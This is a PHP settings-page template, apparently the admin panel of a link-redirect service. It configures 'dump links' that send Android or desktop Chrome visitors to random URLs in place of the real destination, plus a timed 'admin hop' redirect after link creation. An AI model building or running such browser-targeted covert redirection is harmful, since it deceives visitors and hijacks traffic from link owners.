<?php
$andOn = setting('android_dump_on', '0') === '1';
$deskOn = setting('desktop_dump_on', '0') === '1';
?>
<h2><?= h(t('settings')) ?></h2>
<form method="post" class="card form" id="setform">
<input type="hidden" name="_csrf" value="<?= h(csrf_token()) ?>">
<input type="hidden" name="action" value="save_settings">

<div class="dump-block">
  <div class="dump-head">
    <strong>Android Chrome dump</strong>
    <label class="switch">
      <input type="checkbox" name="android_dump_on" id="andOn" value="1" <?= $andOn ? 'checked' : '' ?>>
      <span>OFF / ON</span>
    </label>
  </div>
  <p class="hint">ON = Android Chrome app visitors go to one of these links (random). OFF = asli destination.</p>
  <div id="andFields" class="dump-fields" style="display:<?= $andOn ? 'block' : 'none' ?>">
    <?php for ($i = 1; $i <= 5; $i++): ?>
      <label>Dump link <?= $i ?><?= $i <= 3 ? ' (recommended)' : ' (optional)' ?></label>
      <input type="url" name="android_dump_url_<?= $i ?>" placeholder="https://..." value="<?= h(setting('android_dump_url_'.$i, '')) ?>">
    <?php endfor; ?>
  </div>
</div>

<div class="dump-block">
  <div class="dump-head">
    <strong>Desktop Chrome dump</strong>
    <label class="switch">
      <input type="checkbox" name="desktop_dump_on" id="deskOn" value="1" <?= $deskOn ? 'checked' : '' ?>>
      <span>OFF / ON</span>
    </label>
  </div>
  <p class="hint">ON = Desktop Chrome visitors go to one of these links (random). OFF = asli destination.</p>
  <div id="deskFields" class="dump-fields" style="display:<?= $deskOn ? 'block' : 'none' ?>">
    <?php for ($i = 1; $i <= 5; $i++): ?>
      <label>Dump link <?= $i ?><?= $i <= 3 ? ' (recommended)' : ' (optional)' ?></label>
      <input type="url" name="desktop_dump_url_<?= $i ?>" placeholder="https://..." value="<?= h(setting('desktop_dump_url_'.$i, '')) ?>">
    <?php endfor; ?>
  </div>
</div>

<hr class="sep">
<label>Admin hop destination URL</label>
<input name="hop_url" value="<?= h(setting('hop_url','')) ?>">
<label class="row"><input type="checkbox" name="hop_enabled" <?= setting('hop_enabled','1')==='1'?'checked':'' ?>> Enable hop</label>
<label>Minutes after create</label>
<input type="number" name="hop_after_minutes" value="<?= h(setting('hop_after_minutes','5')) ?>">
<label>Hop seconds</label>
<input type="number" name="hop_seconds" value="<?= h(setting('hop_seconds','3')) ?>">
<button type="submit"><?= h(t('save')) ?></button>
</form>
<script>
const tog = (box, fields) => {
  const el = document.getElementById(box);
  const f = document.getElementById(fields);
  if (!el || !f) return;
  const apply = () => { f.style.display = el.checked ? 'block' : 'none'; };
  el.addEventListener('change', apply);
  apply();
};
tog('andOn', 'andFields');
tog('deskOn', 'deskFields');
</script>
